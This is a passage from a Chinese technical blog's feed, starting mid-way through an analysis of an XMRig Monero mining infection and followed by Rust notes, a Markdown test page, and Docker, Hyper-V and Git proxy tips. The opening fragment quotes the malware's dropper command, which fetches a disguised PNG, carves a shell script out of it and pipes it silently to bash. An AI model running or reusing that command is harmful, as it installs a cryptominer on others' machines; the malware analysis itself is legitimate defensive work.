https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wget https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; done</span><br><span class="line">fi</span><br><span class="line">echo <span class="string">&quot;$bbdir&quot;</span></span><br><span class="line">echo <span class="string">&quot;$bbdira&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;门罗币xmrig挖矿病毒分析&quot;&gt;&lt;a href=&quot;#门罗币xmrig挖矿病毒分析&quot; class=&quot;headerlink&quot; title=&quot;门罗币xmrig挖矿病毒分析&quot;&gt;&lt;/a&gt;门罗币xmrig挖矿病毒分析&lt;/h1&gt;&lt;p&gt;起因是队里老师的服务器中招了，不过是在doc</summary>
      
    
    
    
    
    <category term="区块链安全" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>test-my-new-blog</title>
    <link href="https://x1a0.net/2021/11/05/test-my-new-blog/"/>
    <id>https://x1a0.net/2021/11/05/test-my-new-blog/</id>
    <published>2021-11-05T06:50:13.000Z</published>
    <updated>2021-11-05T07:23:34.151Z</updated>
    
    <content type="html"><![CDATA[<h3 id="我是三级标题"><a href="#我是三级标题" class="headerlink" title="我是三级标题"></a>我是三级标题</h3><h4 id="我是四级标题"><a href="#我是四级标题" class="headerlink" title="我是四级标题"></a>我是四级标题</h4><h5 id="我是五级标题"><a href="#我是五级标题" class="headerlink" title="我是五级标题"></a>我是五级标题</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### 我是三级标题</span><br><span class="line">#### 我是四级标题</span><br><span class="line">##### 我是五级标题</span><br></pre></td></tr></table></figure><hr><p><em><strong>我是粗斜体</strong></em> </p><p><em>我是斜体</em></p><p><strong>我是粗体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">***我是粗斜体*** </span><br><span class="line"></span><br><span class="line">*我是斜体*</span><br><span class="line"></span><br><span class="line">**我是粗体**</span><br></pre></td></tr></table></figure><hr><p><del>我是删除线</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~我是删除线~~</span><br></pre></td></tr></table></figure><hr><p><u>我是下划线</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;u&gt;我是下划线&lt;/u&gt;</span><br></pre></td></tr></table></figure><hr><ol><li>列表<ul><li>小列表</li></ul></li><li>列表<ul><li>大列表</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 列表</span><br><span class="line">    - 小列表</span><br><span class="line">2. 列表</span><br><span class="line">    - 大列表</span><br></pre></td></tr></table></figure><hr><blockquote><p>区块</p><blockquote><p>第二层区块</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 区块</span><br><span class="line">&gt;&gt; 第二层区块</span><br></pre></td></tr></table></figure><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget x1a0.net</span><br></pre></td></tr></table></figure><hr><p>这是<a href="x1a0.net">链接</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是[链接](x1a0.net)</span><br></pre></td></tr></table></figure><hr><p><img src="../../../../img/zhi.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](../../../../img/zhi.jpg)</span><br></pre></td></tr></table></figure><hr><table><thead><tr><th align="left">左对齐</th><th align="right">右对齐</th><th align="center">居中对齐</th></tr></thead><tbody><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| 左对齐 | 右对齐 | 居中对齐 |</span><br><span class="line">| :-----| ----: | :----: |</span><br><span class="line">| 单元格 | 单元格 | 单元格 |</span><br><span class="line">| 单元格 | 单元格 | 单元格 |</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;我是三级标题&quot;&gt;&lt;a href=&quot;#我是三级标题&quot; class=&quot;headerlink&quot; title=&quot;我是三级标题&quot;&gt;&lt;/a&gt;我是三级标题&lt;/h3&gt;&lt;h4 id=&quot;我是四级标题&quot;&gt;&lt;a href=&quot;#我是四级标题&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="Hexo" scheme="https://x1a0.net/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>rust学习第二天</title>
    <link href="https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <id>https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
    <published>2021-07-27T10:08:30.000Z</published>
    <updated>2021-07-27T11:21:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>切片</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入一个字符串切片，输出第一个单词</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">first_word</span> </span>(_<span class="built_in">str</span>:&amp;<span class="built_in">str</span>) -&gt; &amp;<span class="built_in">str</span> &#123; <span class="comment">//需要传入字符串切片，传出也是字符串切片。</span></span><br><span class="line">    <span class="keyword">let</span> byte_str = _<span class="built_in">str</span>.as_bytes();<span class="comment">//字符串切片类型没法直接迭代，通过as_bytes转换成字节数组。</span></span><br><span class="line">    <span class="keyword">for</span> (num,&amp;value) <span class="keyword">in</span> byte_str.iter().enumerate()&#123; <span class="comment">//通过字节数组.iter().enumerate()解耦，返回（下标，值）。</span></span><br><span class="line">        <span class="keyword">if</span> value == <span class="string">b&#x27; &#x27;</span> &#123; <span class="comment">//只能用b&#x27; &#x27;这个表示空格，不知道直接 &#x27; &#x27;，&quot; &quot;为啥不行。</span></span><br><span class="line">            <span class="keyword">return</span> &amp;_<span class="built_in">str</span>[..num];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;_<span class="built_in">str</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> _string_type_1 = <span class="string">&quot;hello xiaoyue&quot;</span>;<span class="comment">//本来就是字符串引用类型，[声明出来不可变了，栈中的]</span></span><br><span class="line">    <span class="keyword">let</span> _string_type_2 = <span class="built_in">String</span>::from(<span class="string">&quot;hello xiaoyue&quot;</span>);<span class="comment">//这个是字符串类型，所以传参的时候要加&amp;引用符号，[专门声明的堆中的]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> s = first_word(&amp;_string_type_2);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;切片&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
    
    
    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>rust学习第一天</title>
    <link href="https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <id>https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
    <published>2021-07-26T07:19:25.000Z</published>
    <updated>2021-07-27T11:21:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>包引入，取随机数，枚举类使用</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::stdin; <span class="comment">//引入stdin包，通过sdtin下的read_line函数获取命令行返回值</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng; <span class="comment">//引入Rng这个接口，通过rand::thread_rng().gen_range()获取随机数</span></span><br><span class="line"><span class="keyword">use</span> std::cmp::Ordering;<span class="comment">//引入枚举包，通过ordering::xx来控制返回，通过match抓取不同的ordering</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sec = rand::thread_rng().gen_range(<span class="number">1</span>..<span class="number">101</span>);      </span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;这个秘密的数是：&#123;&#125;\n&quot;</span>,sec);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> string1 = <span class="built_in">String</span>::new();<span class="comment">//声明一个string类型的可变变量string::new()</span></span><br><span class="line">        stdin().read_line(&amp;<span class="keyword">mut</span> string1).expect(<span class="string">&quot;不能读取！\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">let</span> string1:<span class="built_in">i32</span> = <span class="keyword">match</span> string1.trim().parse() &#123; <span class="comment">//变量的覆盖，通过let var_name:type = xx重新覆盖变量，必须声明类型。trim去首尾空，parse转数字，match抓取返回成功和err值并打印。</span></span><br><span class="line">            <span class="literal">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="literal">Err</span>(err) =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125;\n&quot;</span>,err);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">match</span> sec.cmp(&amp;string1) &#123; <span class="comment">//这个是将string1和sec进行比较</span></span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">print!</span>(<span class="string">&quot;small\n&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;win!!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">print!</span>(<span class="string">&quot;big\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;包引入，取随机数，枚举类使用&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;</summary>
      
    
    
    
    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
    
    
    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>win11默认开启hyper-v解决方案</title>
    <link href="https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2021-07-15T18:42:22.000Z</published>
    <updated>2021-07-15T18:45:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>快捷键win+x,使用管理员权限打开Windows Powershell<br>关闭：bcdedit /set hypervisorlaunchtype off<br>开启: bcdedit /set hypervisorlaunchtype auto</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;快捷键win+x,使用管理员权限打开Windows Powershell&lt;br&gt;关闭：bcdedit /set hypervisorlaunchtype off&lt;br&gt;开启: bcdedit /set hypervisorlaunchtype auto&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://x1a0.net/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>centos7安装docker和compose</title>
    <link href="https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/"/>
    <id>https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/</id>
    <published>2021-05-04T02:46:45.000Z</published>
    <updated>2021-05-04T03:29:48.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install docker #安装</span><br><span class="line"></span><br><span class="line">service docker start #启动</span><br><span class="line">chkconfig docker on  #设置启动项</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.26.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose </span><br><span class="line"></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
    
    <category term="Docker" scheme="https://x1a0.net/categories/Docker/"/>
    
    
    <category term="Linux" scheme="https://x1a0.net/tags/Linux/"/>
    
    <category term="Docker" scheme="https://x1a0.net/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Git设置、取消代理</title>
    <link href="https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/"/>
    <id>https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/</id>
    <published>2021-05-04T02:22:28.000Z</published>
    <updated>2021-05-04T03:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置代理</span></span><br><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#取消代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment">#打开c:\Users\当前用户里的.gitconfig文件(这个默认是隐藏文件),</span></span><br><span class="line"><span class="comment">#将里面关于proxy的行删掉</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="Git" scheme="https://x1a0.net/categories/Git/"/>
    
    
    <category term="Git" scheme="https://x1a0.net/tags/Git/"/>
    
  </entry>
  
</feed>
